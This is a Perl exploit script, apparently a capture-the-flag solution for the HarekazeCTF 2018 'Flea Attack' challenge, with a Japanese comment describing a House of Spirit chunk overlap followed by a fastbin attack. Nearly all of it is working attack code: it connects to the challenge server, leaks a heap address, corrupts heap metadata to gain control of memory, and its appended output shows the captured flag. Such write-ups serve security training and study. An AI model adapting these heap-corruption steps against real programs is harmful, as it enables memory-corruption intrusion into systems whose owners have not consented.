#
# House of Spiritでchunkをオーバーラップした後、fastbin attack
# HarekazeCTF 2018 - Flea Attack 200
#
# Copyright (c) 2014-2019 gpp256
# This software is distributed under the MIT License.

use pwntools;
use Time::HiRes qw (usleep);
$pwntools::ARCH = '64';
#&connect(\$s, 'localhost', 5000) or die "ng";
&connect(\$s, 'problem.harekaze.com', 20175) or die "ng";
&read_until($s, qr/note:/);
my $buf = "\x71" x 127 ."\n" ; syswrite($s, $buf, length($buf));

&add(96, "A" x 0x48 . p(0x41).p(0x2062e0)."\n");
&read_until($s, qr/Addr:\s/);
$data = &read_until($s, qr/\n/);
chomp($data);
$heap_base = hex($data)-0x1250;
printf("[+] heap_base = 0x%016x\n", $heap_base);

&delete($heap_base+0x1250);
&add(96, "A" x 0x48 . p(0x41).p($heap_base+0x12e0)."\n");
&add(96, "A" x 0x18 . p(0x41)."\n");
&delete($heap_base+0x12a0);
&delete($heap_base+0x12c0);
#&delete(0x2062a0);
#&delete(0x2062c0);
&add(48, "A" x 0x18 . p(0x71).p(0x204058+6-8)."\n");
&add(96, "A" x 0x20."\n");
&add(96, "A" x (0x18+1)."\n");
&interact($s);

sub add {
        my $size = shift; my $n = shift;
        print &read_until($s, qr/>\s/);
        my $buf = "1\n"; syswrite($s, $buf, length($buf));
        print &read_until($s, qr/Size:\s/);
        $buf = "$size\n"; syswrite($s, $buf, length($buf));
        print &read_until($s, qr/Name:\s/);
        $buf = $n; syswrite($s, $buf, length($buf));
}
sub delete {
        my $addr = shift;
        print &read_until($s, qr/>\s/);
        my $buf = "2\n"; syswrite($s, $buf, length($buf));
        print &read_until($s, qr/Addr:\s/);
        my $str = sprintf("%08x", $addr);
        $buf = "$str\n"; syswrite($s, $buf, length($buf));
}
__END__
# perl heap.pl
(snip)
Addr: 23f2c0
1. Add name
2. Delete name
3. Exit
> Size: Name:
Done!
Name: AAAAAAAAAAAAAAAAAAAAAAAAA
HarekazeCTF{5m41l_smal1_f1ea_c0n7rol_7h3_w0rld}
